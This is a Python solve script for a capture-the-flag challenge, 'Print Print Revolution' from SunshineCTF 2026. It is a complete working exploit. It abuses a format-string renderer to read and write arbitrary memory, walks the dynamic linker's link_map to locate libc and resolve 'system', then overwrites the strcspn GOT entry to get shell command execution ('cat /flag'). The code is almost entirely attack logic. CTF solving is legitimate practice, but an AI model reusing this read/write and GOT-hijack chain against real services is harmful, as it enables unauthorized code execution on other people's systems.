#!/usr/bin/env python3
"""Solve SunshineCTF 2026's Print Print Revolution challenge."""

from __future__ import annotations

import argparse
import re
import socket
import struct
import sys


DEFAULT_HOST = "chal.sunshinectf.games"
DEFAULT_PORT = 26002

TEMPLATE_PROMPT = b"Enter your score card template:"
SCORE_PROMPT = b"score> "

DT_DEBUG_ADDRESS = 0x403EB0
STRCSPN_GOT = 0x404010

# The custom renderer exposes positional qwords backed by the input buffer.
# Argument 7 starts at byte offset (7 - 1) * 8.
ARG7_OFFSET = 6 * 8
MAX_LINE = 0x1FF
FLAG_PATTERN = re.compile(rb"sun\{[^}\r\n]+\}")


class UnsafePayload(RuntimeError):
    """A packed pointer contains a newline and would split the input line."""


class Renderer:
    def __init__(self, sock: socket.socket):
        self.sock = sock
        self.buffer = bytearray()

    def recv_until(self, marker: bytes, limit: int = 1 << 16) -> bytes:
        while marker not in self.buffer:
            chunk = self.sock.recv(4096)
            if not chunk:
                break
            self.buffer.extend(chunk)
            if len(self.buffer) > limit:
                raise RuntimeError("service output exceeded the expected size")

        if marker in self.buffer:
            end = self.buffer.index(marker) + len(marker)
            result = bytes(self.buffer[:end])
            del self.buffer[:end]
            return result[:-len(marker)]
        result = bytes(self.buffer)
        self.buffer.clear()
        return result

    def start(self) -> None:
        self.sock.settimeout(8)
        self.recv_until(TEMPLATE_PROMPT)

    def submit(self, payload: bytes) -> bytes:
        if b"\n" in payload:
            raise UnsafePayload("payload contains a line feed")
        if len(payload) >= MAX_LINE:
            raise ValueError(f"input is too long: {len(payload)} bytes")
        self.sock.sendall(payload + b"\n")
        return self.recv_until(SCORE_PROMPT)

    @staticmethod
    def _arg_payload(format_string: bytes, values: tuple[int, ...]) -> bytes:
        if len(format_string) >= ARG7_OFFSET:
            raise ValueError("format string overlaps positional argument 7")
        payload = bytearray(format_string)
        payload.extend(b"\0" * (ARG7_OFFSET - len(payload)))
        for value in values:
            packed = struct.pack("<Q", value & 0xFFFFFFFFFFFFFFFF)
            if b"\n" in packed:
                raise UnsafePayload(
                    f"packed argument {value:#x} contains a line feed; retry with a new process"
                )
            payload.extend(packed)
        return bytes(payload)

    def read_string(self, address: int, limit: int = 256) -> bytes:
        marker_start = b"<R>"
        marker_end = b"</R>"
        fmt = marker_start + b"%7$s" + marker_end
        payload = self._arg_payload(fmt, (address,))
        output = self.submit(payload)

        start = output.find(marker_start)
        end = output.find(marker_end, start + len(marker_start))
        if start < 0 or end < 0:
            raise RuntimeError(f"could not find read markers in renderer output: {output!r}")
        return output[start + len(marker_start):end][:limit]

    def read_bytes(self, address: int, size: int) -> bytes:
        if size <= 0:
            return b""
        raw = self.read_string(address, max(size, 256))
        if len(raw) >= size:
            return raw[:size]

        # %s stops at the first NUL. Read the remaining bytes individually so
        # integer fields with interior zero bytes are reconstructed correctly.
        result = bytearray(raw)
        for offset in range(len(raw), size):
            byte = self.read_string(address + offset, 1)
            result.append(byte[0] if byte else 0)
        return bytes(result)

    def read_u32(self, address: int) -> int:
        return int.from_bytes(self.read_bytes(address, 4), "little")

    def read_u64(self, address: int) -> int:
        return int.from_bytes(self.read_bytes(address, 8), "little")

    def write_u64(self, address: int, value: int) -> None:
        payload = self._arg_payload(b"%7$w", (address, value))
        self.submit(payload)


def sysv_hash(name: bytes) -> int:
    value = 0
    for byte in name:
        value = (value << 4) + byte
        high = value & 0xF0000000
        if high:
            value ^= high >> 24
        value &= ~high
    return value & 0xFFFFFFFF


def find_libc(renderer: Renderer) -> tuple[int, int]:
    r_debug = renderer.read_u64(DT_DEBUG_ADDRESS)
    if not r_debug:
        raise RuntimeError("DT_DEBUG was null")
    link_map = renderer.read_u64(r_debug + 8)
    seen: set[int] = set()

    for _ in range(128):
        if not link_map or link_map in seen:
            break
        seen.add(link_map)

        load_address = renderer.read_u64(link_map)
        name_pointer = renderer.read_u64(link_map + 8)
        name = renderer.read_string(name_pointer, 256) if name_pointer else b""
        if b"libc.so" in name:
            return load_address, renderer.read_u64(link_map + 0x10)

        link_map = renderer.read_u64(link_map + 0x18)

    raise RuntimeError("could not find libc in the link_map list")


def resolve_symbol(renderer: Renderer, dynamic: int, name: bytes) -> int:
    tags: dict[int, int] = {}
    for index in range(256):
        tag = renderer.read_u64(dynamic + index * 16)
        value = renderer.read_u64(dynamic + index * 16 + 8)
        if tag == 0:
            break
        tags[tag] = value

    # DT_HASH=4, DT_STRTAB=5, DT_SYMTAB=6, DT_SYMENT=11
    hash_table = tags.get(4)
    string_table = tags.get(5)
    symbol_table = tags.get(6)
    symbol_size = tags.get(11, 24)
    if not hash_table or not string_table or not symbol_table or symbol_size != 24:
        raise RuntimeError("libc is missing the expected SysV symbol tables")

    bucket_count = renderer.read_u32(hash_table)
    if not bucket_count:
        raise RuntimeError("libc's SysV hash table has no buckets")

    chain_count = renderer.read_u32(hash_table + 4)
    bucket_index = sysv_hash(name) % bucket_count
    symbol_index = renderer.read_u32(hash_table + 8 + bucket_index * 4)
    chains = hash_table + 8 + bucket_count * 4

    for _ in range(chain_count):
        if symbol_index == 0:
            break
        symbol = symbol_table + symbol_index * symbol_size
        name_offset = renderer.read_u32(symbol)
        symbol_name = renderer.read_string(string_table + name_offset, 128)
        if symbol_name == name:
            return renderer.read_u64(symbol + 8)
        symbol_index = renderer.read_u32(chains + symbol_index * 4)

    raise RuntimeError(f"symbol {name.decode(errors='replace')} was not found")


def exploit_once(host: str, port: int) -> bytes:
    with socket.create_connection((host, port), timeout=8) as sock:
        sock.settimeout(8)
        renderer = Renderer(sock)
        renderer.start()

        libc_base, dynamic = find_libc(renderer)
        system_offset = resolve_symbol(renderer, dynamic, b"system")
        system_address = libc_base + system_offset
        print(f"libc base: {libc_base:#x}")
        print(f"system:    {system_address:#x}")

        renderer.write_u64(STRCSPN_GOT, system_address)
        sock.sendall(b"cat /flag\n")
        return renderer.recv_until(SCORE_PROMPT)


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host", default=DEFAULT_HOST)
    parser.add_argument("--port", type=int, default=DEFAULT_PORT)
    parser.add_argument("--attempts", type=int, default=12,
                        help="retry when an ASLR address contains a line feed")
    args = parser.parse_args()

    for attempt in range(1, args.attempts + 1):
        try:
            output = exploit_once(args.host, args.port)
            match = FLAG_PATTERN.search(output)
            if match:
                print(match.group().decode())
                return 0
            print(output.decode("latin-1", errors="replace"))
            raise RuntimeError("flag was not present in the service response")
        except UnsafePayload as error:
            print(f"attempt {attempt}: {error}", file=sys.stderr)
        except (OSError, EOFError, RuntimeError) as error:
            if attempt == args.attempts:
                raise
            print(f"attempt {attempt}: {error}", file=sys.stderr)

    raise RuntimeError("all attempts failed")


if __name__ == "__main__":
    raise SystemExit(main())